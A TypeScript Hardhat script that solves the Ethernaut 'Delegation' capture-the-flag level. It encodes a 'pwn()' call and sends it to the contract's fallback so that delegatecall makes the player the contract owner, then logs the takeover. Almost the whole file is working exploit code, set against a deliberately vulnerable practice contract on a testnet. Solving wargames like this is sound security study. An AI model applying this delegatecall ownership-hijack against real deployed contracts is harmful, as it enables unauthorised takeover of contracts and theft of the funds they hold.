import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackDelegation = async () => {
    // change contract addresses here.
    const delegationAddress = "0x063380A0ba27e70539Bb1873dCFc82C47583a040"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)

    // Don't touch below 🚀
    // Vulnerability from being able to change owner of contract by using
    // additional read:
    // https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [{ internalType: "address", name: "_delegateAddress", type: "address" }],
            outputs: [],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "constructor",
        },
        {
            stateMutability: "nonpayable",
            type: "fallback",
        },
        {
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt("Delegation", delegationAddress);
    console.log("Checking current contract owner...");
    const oldOwner = await contract.owner();
    console.log(`Current contract owner: ${oldOwner}`);
    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const PRIVATE_KEY =
        process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
    const wallet = new Wallet(PRIVATE_KEY, provider);
    // endoding function here
    console.log("Encoding function signature...");
    const iface = new ethers.utils.Interface(["function pwn()"]);
    const signature = iface.encodeFunctionData("pwn");
    // sending transaction here
    console.log("Now sending transaction to call fallback ...");
    const tx = await wallet.sendTransaction({
        from: player,
        to: delegationAddress,
        data: signature,
    });
    console.log(tx);
    const txReceipt = await tx.wait(1);
    console.log(txReceipt);
    console.log("Checking if player is now owner...");
    const newOwner = await contract.owner();
    console.log(`Contract Owner is now: ${newOwner}`);
    const owner = newOwner === player;
    console.log(`Player is now owner: ${owner}`);
    if (owner) {
        console.log("Congrats! Player is now the new owner...");
        console.log("Done...submit in ethernaut");
    } else {
        console.log("Player is not owner, please review code above");
    }
};

attackDelegation()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
